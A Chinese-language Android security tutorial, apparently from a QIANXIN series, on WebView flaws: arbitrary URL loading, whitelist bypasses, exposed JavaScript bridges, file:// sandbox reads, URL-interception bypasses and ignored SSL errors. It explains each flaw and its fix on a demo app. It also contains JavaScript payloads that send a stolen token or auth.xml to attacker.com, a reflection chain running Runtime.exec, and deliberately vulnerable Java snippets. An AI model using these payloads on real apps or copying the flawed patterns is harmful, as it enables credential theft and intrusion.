# Android移动安全第五章_WebView安全
> QIANXIN Team
> 来源：https://forum.butian.net/share/4840

> 系列目录：
> 
> 1.  Android 组件导出安全
> 2.  Android Intent 安全
> 3.  Android Binder 服务安全
> 4.  Android ContentProvider 安全
> 5.  Android WebView 安全（本章）
> 6.  Android UI 欺骗与钓鱼
> 7.  Android Deep Link 安全
> 8.  Android 广播安全
> 9.  Android PendingIntent 安全
> 10.  Android 系统设置安全
> 11.  Android SSRF 与网络安全
> 12.  Android 加密与数据存储安全
> 13.  Android 认证与证书校验
> 14.  Android Zip Slip 路径遍历
> 15.  Android Fragment Injection
> 16.  Android SELinux 与沙箱机制

* * *

## 1\. 前言

很多 Android App 不是纯原生开发的，它们会用 WebView（Android 提供的内嵌浏览器组件）加载 HTML 页面来实现部分功能——活动页、帮助文档、支付页面、甚至整个应用的主界面。这种开发方式通常叫混合开发（Hybrid），原生代码和 Web 页面各负责一部分功能。

WebView 运行在 App 进程中，能执行 JavaScript、访问网络、渲染 HTML/CSS，底层和 Chrome 使用相同的渲染引擎（Chromium）。和独立浏览器不同的是，WebView 拥有宿主 App 的所有权限，而且可以通过 JavaScript Bridge（JS 桥接，后面第 4 节会详细讲）与原生代码交互。如果攻击者能控制 WebView 加载的内容，就等于在 App 的上下文中执行代码。

本章围绕 WebView 的几个攻击方向展开：URL 来源是否可控、JavaScript 接口暴露、文件协议访问、URL 跳转拦截逻辑、以及 SSL 证书校验。

* * *

## 2\. WebView 基础配置

### 2.1 基本使用

在 Activity 中使用 WebView：

```java
WebView webView = findViewById(R.id.webview);
webView.loadUrl("https://example.com");
```

默认情况下 WebView 的功能比较受限——JavaScript 禁用、不能访问本地文件、没有 JS Bridge。开发者需要通过 WebSettings（WebView 的配置类）逐项开启：

```java
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);          
settings.setAllowFileAccess(true);            
settings.setAllowFileAccessFromFileURLs(true);
settings.setDomStorageEnabled(true);          
```

每开启一项，就多一个攻击面。

### 2.2 WebViewClient 与 URL 拦截

WebViewClient 是 WebView 的事件回调接口，开发者通过它控制页面加载行为。其中 `shouldOverrideUrlLoading()` 在 WebView 即将加载一个新 URL 时被调用，开发者可以在这里拦截并自行处理：

```java
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        String url = request.getUrl().toString();
        if (url.startsWith("myapp://")) {
            handleCustomScheme(url);
            return true;  
        }
        return false;  
    }
});
```

这个方法是很多漏洞的触发点——拦截逻辑有缺陷的话，攻击者可以绕过白名单加载恶意页面，或者通过自定义协议触发敏感操作。

### 2.3 WebChromeClient

WebChromeClient 处理 JavaScript 的 UI 交互，比如 `alert()`、`confirm()`、`prompt()` 弹窗，以及文件选择（`<input type="file">`）、地理位置请求等。

从安全角度看，`onShowFileChooser()` 值得注意——如果 WebView 加载了攻击者控制的页面，页面中的 `<input type="file">` 可以触发文件选择器，用户选择的文件会被上传到攻击者的服务器。

* * *

## 3\. 任意 URL 加载

### 3.1 原理

导出的 Activity 从 Intent 中读取 URL，然后传给 `WebView.loadUrl()`，没有做校验：

```java
public class WebActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_web);
        WebView webView = findViewById(R.id.webview);
        webView.getSettings().setJavaScriptEnabled(true);

        String url = getIntent().getStringExtra("url");
        if (url != null) {
            webView.loadUrl(url);  
        }
    }
}
```

攻击者可以让这个 WebView 加载任意页面。如果 WebView 还启用了 JavaScript 并注册了 JS Bridge，攻击者的页面就能调用 App 暴露的原生方法。

### 3.2 URL 白名单绕过

有些开发者会加一个域名白名单检查：

```java
String url = getIntent().getStringExtra("url");
if (url != null && url.contains("example.com")) {
    webView.loadUrl(url);
}
```

这种基于字符串包含的检查容易绕过：

-   `https://evil.com/example.com` — 路径中包含目标域名
-   `https://example.com.evil.com` — 子域名伪造
-   `https://evil.com?redirect=example.com` — 参数中包含

正确的做法是解析 URL 后检查 host：

```java
Uri uri = Uri.parse(url);
String host = uri.getHost();
if (host != null && (host.endsWith(".example.com") || "example.com".equals(host))) {
    webView.loadUrl(url);
}
```

但即使 host 检查正确，如果目标域名本身存在开放重定向（Open Redirect，服务端根据参数跳转到任意 URL 的功能），攻击者仍然可以通过 `https://example.com/redirect?to=https://evil.com` 绕过白名单。

下面用配套的演示 App（com.demo.webviewsecurity）来展示。VulnWebActivity 从 Intent 读取 URL 直接加载，没有任何校验：

```bash
adb shell am start -n com.demo.webviewsecurity/.VulnWebActivity \
    --es url "https://example.com"
```

WebView 加载了外部传入的 URL：

![demo5_vuln_url.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-c4430ad5ece87ac52848e7b01ad78662ded9142b.png)

传入攻击者控制的页面时，页面中的 JavaScript 就在 App 的上下文中执行。

* * *

## 4\. JavaScript Bridge 暴露

### 4.1 addJavascriptInterface

Android 提供了 `addJavascriptInterface()` 方法，让开发者把 Java 对象暴露给 WebView 中的 JavaScript 代码。注册后，WebView 中加载的任何页面都可以通过 JavaScript 调用这些方法：

```java
public class AppBridge {
    private Context context;

    public AppBridge(Context context) {
        this.context = context;
    }

    @JavascriptInterface
    public String getToken() {
        SharedPreferences prefs = context.getSharedPreferences("auth", MODE_PRIVATE);
        return prefs.getString("token", "");
    }

    @JavascriptInterface
    public String getDeviceId() {
        return Settings.Secure.getString(
            context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    @JavascriptInterface
    public void writeFile(String filename, String content) {
        File file = new File(context.getFilesDir(), filename);
        
    }
}


webView.addJavascriptInterface(new AppBridge(this), "NativeBridge");
```

网页中的 JavaScript 通过 `window.NativeBridge` 调用：

```javascript
var token = NativeBridge.getToken();
var deviceId = NativeBridge.getDeviceId();
NativeBridge.writeFile("config.txt", "malicious_content");
```

`@JavascriptInterface` 注解是 Android 4.2（API 17）引入的，标记哪些方法可以被 JavaScript 调用。没有这个注解的方法不会暴露。在 Android 4.2 之前，注册的对象的所有 public 方法都会暴露，包括从 Object 继承的 `getClass()`——攻击者可以通过反射链执行任意 Java 代码。

### 4.2 攻击条件

JS Bridge 暴露的危害取决于两个条件：

1.  攻击者能否控制 WebView 加载的页面（任意 URL 加载漏洞）
2.  Bridge 暴露了哪些方法

两个条件同时满足时，攻击者的页面就能调用 App 的原生方法。常见的危险方法类型：

| 方法类型 | 示例 | 危害 |
| --- | --- | --- |
| 读取凭证 | getToken()、getCookie() | 窃取认证信息 |
| 读取设备信息 | getDeviceId()、getPhoneNumber() | 隐私泄露 |
| 文件操作 | readFile()、writeFile() | 读写 App 沙箱文件 |
| 执行命令 | exec()、runCommand() | 命令执行 |
| 发送请求 | httpRequest()、postData() | SSRF、数据外传 |

### 4.3 演示

演示 App 的 VulnBridgeActivity 注册了一个 JS Bridge（NativeBridge），暴露了 getToken()、getDeviceInfo()、writeLog() 三个方法。默认加载一个内置的演示页面，页面中的 JavaScript 调用这些方法并显示结果：

```bash
adb shell am start -n com.demo.webviewsecurity/.VulnBridgeActivity
```

内置演示页面提供了三个按钮，分别调用 Bridge 暴露的方法：

![demo5_bridge_page.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-482824accfaa9b7e6aaca712d90b11234a8a1350.png)

通过 logcat 可以看到 Bridge 方法被调用：

```bash
adb logcat -s NativeBridge
```

输出：

```php
I NativeBridge: getToken() called, returning: eyJhbGciOiJIUzI1NiJ9.demo_secret_token
I NativeBridge: getDeviceInfo() called, returning: Model=23049RAD8C, SDK=35, Brand=Redmi
I NativeBridge: writeLog() called: test_log_from_javascript_1771751687876
```

getToken() 返回了 App 存储的认证 token，getDeviceInfo() 返回了设备型号和系统版本，writeLog() 向 App 私有目录写入了日志。这些操作都是网页中的 JavaScript 触发的。

也可以通过 Intent 传入外部 URL，让 WebView 加载攻击者的页面，效果相同：

```bash
adb shell am start -n com.demo.webviewsecurity/.VulnBridgeActivity \
    --es url "https://attacker.com/steal.html"
```

攻击者的页面可以执行：

```javascript

var token = NativeBridge.getToken();
var info = NativeBridge.getDeviceInfo();
new Image().src = "https://attacker.com/collect?token=" + token + "&info=" + info;
```

* * *

## 5\. file:// 协议攻击

### 5.1 相关配置项

WebView 有几个控制文件访问的配置：

| 配置项 | 默认值 | 作用 |
| --- | --- | --- |
| setAllowFileAccess | API < 30: true; API >= 30: false | 是否允许加载 file:// URL |
| setAllowFileAccessFromFileURLs | API < 16: true; 之后: false | file:// 页面能否通过 JS 读取其他 file:// |
| setAllowUniversalAccessFromFileURLs | API < 16: true; 之后: false | file:// 页面能否通过 JS 访问任意来源 |
| setAllowContentAccess | true | 是否允许加载 content:// URL |

`setAllowFileAccessFromFileURLs` 和 `setAllowUniversalAccessFromFileURLs` 允许通过 file:// 加载的页面用 JavaScript（XMLHttpRequest 或 fetch）读取设备上的其他文件。

### 5.2 攻击原理

如果 WebView 同时满足以下条件：

1.  允许加载 file:// URL（setAllowFileAccess(true)）
2.  启用了 JavaScript（setJavaScriptEnabled(true)）
3.  允许 file:// 页面跨域读取（setAllowFileAccessFromFileURLs(true) 或 setAllowUniversalAccessFromFileURLs(true)）
4.  攻击者能控制加载的 URL

攻击者可以让 WebView 加载一个本地 HTML 文件，文件中的 JavaScript 读取 App 沙箱内的其他文件：

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.target.app/shared_prefs/auth.xml", true);
xhr.onload = function() {
    new Image().src = "https://attacker.com/collect?data=" + encodeURIComponent(xhr.responseText);
};
xhr.send();
```

### 5.3 利用路径

攻击者需要先把恶意 HTML 文件放到设备上，然后让目标 App 的 WebView 加载它。常见的方式：

1.  通过另一个漏洞（比如上一章讲的 ContentProvider openFile 路径遍历）向目标 App 的目录写入 HTML 文件
2.  利用 App 的下载功能，让 App 自己下载恶意 HTML 到已知路径
3.  把 HTML 文件放到外部存储（/sdcard/），然后通过任意 URL 加载漏洞让 WebView 加载 `file:///sdcard/evil.html`

### 5.4 演示

演示 App 的 VulnFileActivity 开启了 `setAllowFileAccessFromFileURLs(true)` 和 `setJavaScriptEnabled(true)`，并且接受 Intent 传入的 URL。

先在设备上创建一个测试 HTML 文件，然后让 WebView 加载它：

```bash

adb shell "run-as com.demo.webviewsecurity sh -c \
    'echo \"<html><body><h3>file:// loaded</h3><script>document.write(location.href)</script></body></html>\" \
    > /data/data/com.demo.webviewsecurity/files/test.html'"


adb shell am start -n com.demo.webviewsecurity/.VulnFileActivity \
    --es url "file:///data/data/com.demo.webviewsecurity/files/test.html"
```

WebView 加载了本地文件：

![demo5_file_access.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-8ac4ebf2ba61810c758096533dbb41f9ac0ef3f1.png)

在 `setAllowFileAccessFromFileURLs(true)` 的配置下，页面中的 JavaScript 可以通过 XMLHttpRequest 读取同一 App 沙箱内的其他文件。

* * *

## 6\. shouldOverrideUrlLoading 绕过

### 6.1 首次加载不触发

`shouldOverrideUrlLoading()` 只在页面内的链接跳转时触发，不会在 `loadUrl()` 直接加载时触发。如果攻击者能控制 `loadUrl()` 的参数，白名单检查根本不会执行：

```java
@Override
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    String url = request.getUrl().toString();
    if (!isWhitelisted(url)) {
        return true;  
    }
    return false;
}


String url = getIntent().getStringExtra("url");
webView.loadUrl(url);  
```

### 6.2 重定向和 JavaScript 跳转

HTTP 302 重定向在某些 Android 版本上不会触发 `shouldOverrideUrlLoading()`。攻击者可以先让 WebView 加载一个白名单内的 URL，该 URL 返回 302 重定向到恶意页面。

通过 JavaScript 的 `window.location` 跳转在某些情况下也不会触发拦截：

```javascript
window.location = "https://evil.com";
window.location.replace("https://evil.com");
```

### 6.3 自定义协议处理

很多 App 在 `shouldOverrideUrlLoading()` 中处理自定义协议（如 `myapp://`、`jsbridge://`）。如果处理逻辑不安全，攻击者可以通过构造特殊 URL 触发敏感操作：

```java
@Override
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    String url = request.getUrl().toString();
    if (url.startsWith("jsbridge://")) {
        String[] parts = url.replace("jsbridge://", "").split("/");
        String method = parts[0];
        if ("getToken".equals(method)) {
            String token = getAuthToken();
            view.evaluateJavascript("callback('" + token + "')", null);
        } else if ("writeFile".equals(method)) {
            writeFile(parts[1], parts[2]);
        }
        return true;
    }
    return false;
}
```

这种基于 URL 的 JS Bridge 和 `addJavascriptInterface` 的风险类似，但更隐蔽——不需要注册 JavaScript 接口，只需要在 WebView 中加载一个包含 `<iframe src="jsbridge://getToken">` 的页面就能触发。

* * *

## 7\. SSL 错误处理

当 WebView 加载 HTTPS 页面遇到证书错误时（过期、域名不匹配、自签名等），会回调 `onReceivedSslError()`。正确的做法是取消加载：

```java
@Override
public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
    handler.cancel();  
}
```

但有些开发者直接调用 `handler.proceed()` 忽略证书错误：

```java
@Override
public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
    handler.proceed();  
}
```

这等于禁用了 HTTPS 的证书验证，中间人攻击（MITM，Man-In-The-Middle，攻击者在通信双方之间截获和篡改数据）可以拦截和篡改 WebView 加载的所有 HTTPS 内容。

Google Play 会检测并拒绝包含 `handler.proceed()` 的应用上架，但国内应用市场和系统预装 App 不受此限制。

* * *

## 8\. 版本演进

### 8.1 Android 4.2（API 17）：@JavascriptInterface 注解

Android 4.2 之前，`addJavascriptInterface()` 注册的对象的所有 public 方法都暴露给 JavaScript，包括从 Object 继承的 `getClass()` 方法。攻击者可以通过反射链执行任意命令：

```javascript

var obj = window.injectedObj;
var runtime = obj.getClass().forName("java.lang.Runtime");
var exec = runtime.getMethod("exec", obj.getClass().forName("java.lang.String"));
var process = exec.invoke(runtime.getMethod("getRuntime").invoke(null), "id");
```

Android 4.2 引入 `@JavascriptInterface` 注解后，只有标记了该注解的方法才会暴露。

### 8.2 Android 5.0（API 21）：独立 WebView 进程

从 Android 5.0 开始，WebView 的渲染引擎从 App 进程中分离，运行在独立的沙箱进程中。即使渲染引擎存在内存破坏漏洞，攻击者也需要额外的沙箱逃逸才能影响 App 进程。

但 JS Bridge 的调用仍然在 App 进程中执行，`addJavascriptInterface` 暴露的方法不受进程隔离的保护。

### 8.3 Android 7.0（API 24）：WebView 独立更新

Android 7.0 开始，WebView 组件通过 Google Play 独立更新，不依赖系统 OTA。但国内设备通常没有 Google Play，WebView 更新依赖厂商的系统更新。

### 8.4 Android 9.0（API 28）：默认禁用明文 HTTP

Android 9.0 引入了 Network Security Config（网络安全配置），默认禁止明文 HTTP 流量。WebView 加载 `http://` URL 会被阻止，除非 App 在配置中显式允许：

```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="true" />
</network-security-config>
```

### 8.5 Android 11（API 30）：file:// 访问默认关闭

Android 11 开始，`setAllowFileAccess()` 的默认值从 true 改为 false。WebView 默认不再能加载 file:// URL。但如果开发者显式设置 `setAllowFileAccess(true)`，风险依然存在。

* * *

## 9\. 总结

WebView 把 Web 的攻击面引入了 Android App。

回顾一下：

-   任意 URL 加载是基础漏洞，攻击者控制了 WebView 加载的内容，后续的 JS Bridge 调用、文件读取都建立在这个前提上
-   addJavascriptInterface 暴露的方法决定了攻击者能做什么，getToken、writeFile 这类方法暴露后可以被任意页面调用
-   file:// 协议配合 setAllowFileAccessFromFileURLs 可以读取 App 沙箱内的文件，Android 11+ 默认关闭了 file:// 访问
-   shouldOverrideUrlLoading 的拦截逻辑有多种绕过方式，loadUrl 直接加载时不触发
-   onReceivedSslError 中调用 handler.proceed() 等于禁用了 HTTPS 证书验证

下一章讲 Android UI 欺骗与钓鱼。WebView 可以加载攻击者的页面，而 UI 欺骗利用 Android 的窗口机制，在受害 App 上方覆盖伪造的界面，诱导用户输入密码或点击授权。

通过网盘分享的文件：webviwe.apk  
链接: [https://pan.baidu.com/s/1QetwOe2HzSDHCp6K51PbpQ?pwd=bnv4](https://pan.baidu.com/s/1QetwOe2HzSDHCp6K51PbpQ?pwd=bnv4) 提取码: bnv4
